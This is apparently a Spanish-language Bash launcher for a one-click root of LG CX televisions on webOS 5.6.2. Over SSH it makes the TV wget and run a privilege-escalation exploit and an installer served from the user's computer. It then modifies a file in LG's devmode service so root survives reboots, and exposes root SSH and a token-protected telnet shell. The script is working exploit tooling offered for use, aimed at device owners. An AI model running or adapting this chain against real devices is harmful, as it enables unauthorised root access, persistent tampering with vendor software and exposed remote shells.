#!/usr/bin/env bash
# ============================================================
#  LG webOS 5.x one-click root, v1 (2026-10), Natxo
#  Root permanente (certificado en LG CX: webOS 5.6.2 / fw 04.64.00)
#  Exploit de escalada por GPU: JAMES McVAY (gfx_cred_escalate.py, obra suya,
#  publicada con todo el crédito; la cadena permanente es de Natxo)
# ============================================================
set -euo pipefail
cd "$(dirname "$0")"

echo "======================================================"
echo "  LG CX ROOT, one-click v1"
echo "  (webOS 5.6.2 / fw 04.64.00, otras versiones NO)"
echo "======================================================"
echo
echo "ANTES DE EMPEZAR (importante):"
echo "  1. La TV debe tener el MODO DESARROLLADOR activo:"
echo "     app 'Developer Mode' de LG → login cuenta LG developer"
echo "     → 'Key Server' ACTIVADO."
echo "  2. Este ordenador y la TV en la MISMA red WiFi."
echo "  3. Dura 15-30 minutos. MIENTRAS CORRE:"
echo "     - NO apagues la TV (el botón la suspende, no la apaga)"
echo "     - NO dejes que se duerma: lo mejor es VER LA TELE"
echo "     - mejor desactiva antes: Ajustes → General → Eco →"
echo "       'Auto Power Off' / 'No Signal Power Off' / 'Temporizador'"
echo "  4. Si tu TV usa QuickStart+, el botón de encendido la"
echo "     suspende, para apagarla de verdad: desenchufa 30s."
echo
read -r -p "¿TV lista y con el Developer Mode activo? (s/n) " ok
[ "${ok,,}" = "s" ] || { echo "Vuelve cuando esté lista."; exit 1; }

# ---- 1. IP de la TV ----
TV="${1:-}"
if [ -z "$TV" ]; then
  read -r -p "IP de la TV (la ves en la app Developer Mode): " TV
fi
[ -n "$TV" ] || { echo "IP vacía"; exit 1; }
echo "→ TV: $TV"
MYIP="$(ipconfig getifaddr en0 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')"
[ -n "$MYIP" ] || { echo "No encuentro la IP de este ordenador"; exit 1; }

# ---- 2. Clave SSH de devmode ----
mkdir -p "$HOME/.lg-cx-root"
KEY="$HOME/.lg-cx-root/webos_rsa"
if [ ! -s "$KEY" ]; then
  echo "→ Descargando clave del Key Server (http://$TV:9991/webos_rsa)…"
  curl -sf "http://$TV:9991/webos_rsa" -o "$KEY" || {
    echo "ERROR: no se pudo descargar la clave."; echo
    echo "Comprueba: (a) Key Server ACTIVADO en la app Developer Mode";
    echo "(b) TV y ordenador en la misma red. (c) la IP es correcta.";
    exit 1; }
  chmod 600 "$KEY"
fi
# derivar el pubkey → será el authorized_keys del root
ssh-keygen -y -f "$KEY" > payload/authorized_keys 2>/dev/null || true
read -r -s -p "Passphrase de la clave (la que pusiste en la app Developer Mode): " PASS
echo

# ---- 2b. hostkey del sshd (la TV NO tiene ssh-keygen: PEM obligatorio) ----
echo "→ Generando hostkey (RSA 2048, formato PEM)…"
rm -f payload/hostkey payload/hostkey.pub
ssh-keygen -t rsa -b 2048 -m PEM -N "" -f payload/hostkey -C lg-cx-root >/dev/null

# ---- 2c. hook con la IP de este ordenador embebida (el exploit lo llama sin args) ----
sed "s|__HOST__|$MYIP|g" payload/rootcmd_install.sh > payload/rootcmd.sh
chmod 755 payload/rootcmd.sh
grep -q "$MYIP" payload/rootcmd.sh || { echo "ERROR preparando el instalador"; exit 1; }

cat > /tmp/lgcx.exp <<EOF
#!/usr/bin/expect -f
set timeout 25
spawn ssh -i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \\
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \\
  -p 9922 prisoner@$TV "echo CONECTADO_OK"
expect {
  "passphrase" { send "$PASS\r"; exp_continue }
  "CONECTADO_OK" { exit 0 }
  timeout { puts "TIMEOUT"; exit 1 }
  eof { exit 1 }
}
EOF
chmod +x /tmp/lgcx.exp
echo "→ Probando conexión a la TV…"
if ! expect /tmp/lgcx.exp >/dev/null 2>&1; then
  echo "ERROR: no se pudo conectar por :9922 (¿passphrase correcta? ¿Dev Mode activo?)"
  exit 1
fi
echo "  ✓ Conexión OK"

# ---- 3. Servir el payload ----
PORT=8899
# manifiesto de apps (el instalador los registra con icono en el launcher)
# YouTube AdFree NO se empaqueta para otros usuarios (material parcheado): filtro explícito
ls payload/apps/*.ipk 2>/dev/null | grep -vi 'adfree' | xargs -n1 basename > payload/apps/manifest.txt || true
echo "→ Sirviendo payload en :$PORT…"
python3 -m http.server $PORT >/dev/null 2>&1 &
SRV=$!
trap 'kill $SRV 2>/dev/null || true' EXIT

# ---- 4. Lanzar exploit + instalador (python2 -u: sin -u el log se traga el desenlace) ----
LAUNCH="wget -q http://$MYIP:$PORT/payload/gfx_cred_escalate.py -O /tmp/gfx_cred_escalate.py && wget -q http://$MYIP:$PORT/payload/rootcmd.sh -O /tmp/rootcmd.sh && chmod 755 /tmp/gfx_cred_escalate.py /tmp/rootcmd.sh && wc -c /tmp/gfx_cred_escalate.py /tmp/rootcmd.sh; setsid nohup sh -c 'ulimit -n 4096 2>/dev/null; python2 -u /tmp/gfx_cred_escalate.py go > /tmp/gfx_go.log 2>&1' >/dev/null 2>&1 & echo LANZADO"

cat > /tmp/lgcx-run.exp <<EOF
#!/usr/bin/expect -f
set timeout 40
spawn ssh -i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \\
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \\
  -p 9922 prisoner@$TV {$LAUNCH}
expect {
  "passphrase" { send "$PASS\r"; exp_continue }
  "LANZADO" { exit 0 }
  timeout { exit 1 }
}
EOF
chmod +x /tmp/lgcx-run.exp
expect /tmp/lgcx-run.exp >/dev/null 2>&1 || { echo "ERROR lanzando el exploit"; exit 1; }
echo "→ Exploit lanzado. AHORA: no toques la TV (15-30 min)…"

# ---- 5. Esperar :22 ----
ROOTOK=0
for i in $(seq 1 80); do
  sleep 30
  if python3 -c "import socket;s=socket.socket();s.settimeout(2);exit(0 if s.connect_ex(('$TV',22))==0 else 1)" 2>/dev/null; then
    ROOTOK=1
    break
  fi
  [ $((i % 4)) -eq 0 ] && echo "  …esperando root ($(($i/2)) min)"
done

if [ $ROOTOK -eq 0 ]; then
  echo
  echo "TIMEOUT: 40 min sin :22. Informe de la TV:"
  cat > /tmp/lgcx-diag.exp <<EOF
#!/usr/bin/expect -f
set timeout 25
spawn ssh -i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \\
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \\
  -p 9922 prisoner@$TV {cat /tmp/ROOTED.txt 2>/dev/null; tail -5 /tmp/gfx_go.log 2>/dev/null}
expect {
  "passphrase" { send "$PASS\r"; exp_continue }
  eof { exit 0 }
}
EOF
  chmod +x /tmp/lgcx-diag.exp
  expect /tmp/lgcx-diag.exp 2>/dev/null | sed 's/^/  /'
  echo
  echo "Vuelve a lanzar el script (es reintentable)."
  exit 1
fi

echo
echo "======================================================"
echo "  🏆 ROOT CONSEGUIDO (:22 abierto), etapa final SSH"
echo "======================================================"

# ---- 6. Etapa SSH final: shim (persistencia) + verificación ----
ssh -i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -p 22 "root@$TV" 'sh -s' <<'EOS'
N=/media/developer/natxo
CG=/proc/1/root/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service
# shim de persistencia (el jail del exploit no puede: aquí sí)
for CGV in "$CG" "/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service"; do
  CH=$CGV/node_modules/chokidar
  if [ -f $CH/index.js ] && ! grep -q NATXO_BOOTROOT $CH/index.js 2>/dev/null; then
    [ -f $N/devmode-state/chokidar-index.js.ORIGINAL ] || cp $CH/index.js $N/devmode-state/chokidar-index.js.ORIGINAL
    cat $N/devmode-state/shim-chokidar.js $CH/index.js > /tmp/idx.tmp && cp /tmp/idx.tmp $CH/index.js
    echo "SHIM INSTALADO ($CGV)"
  fi
done
grep -q NATXO_BOOTROOT $CG/node_modules/chokidar/index.js 2>/dev/null && echo "PERSISTENCIA: OK" || echo "PERSISTENCIA: REVISAR (shim sin marcar)"
# token del daemon → NZ Store (el ipk viaja con placeholder)
TOK=$(cat $N/daemon/token)
for CFG in /media/developer/apps/usr/palm/applications/com.natxobsd.nzstore/config.js \
           /media/cryptofs/apps/usr/palm/applications/com.natxobsd.nzstore/config.js; do
  [ -f "$CFG" ] && sed -i "s/NZ_TOKEN = '[^']*'/NZ_TOKEN = '$TOK'/" "$CFG" 2>/dev/null && echo "TOKEN_INJECT OK"
done
id -u
grep -E 'HOSTKEY|SHIM|APP_|PORT22' /tmp/ROOTED.txt 2>/dev/null
EOS

TOKEN="$(ssh -i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -p 22 "root@$TV" 'cat /media/developer/natxo/daemon/token' 2>/dev/null || true)"

echo
echo "  Token (telnet/API): ${TOKEN:-<ver /media/developer/natxo/daemon/token>}"
echo "  Telnet:  telnet $TV   (contraseña = el token)"
echo "  SSH:     ssh -i $KEY -p 22 root@$TV"
echo "  Estado:  curl -H \"X-Natxo-Token: $TOKEN\" http://127.0.0.1:7777/status (desde la TV)"
echo
echo "  La TV ya arranca rootada sola. 🎉"
exit 0
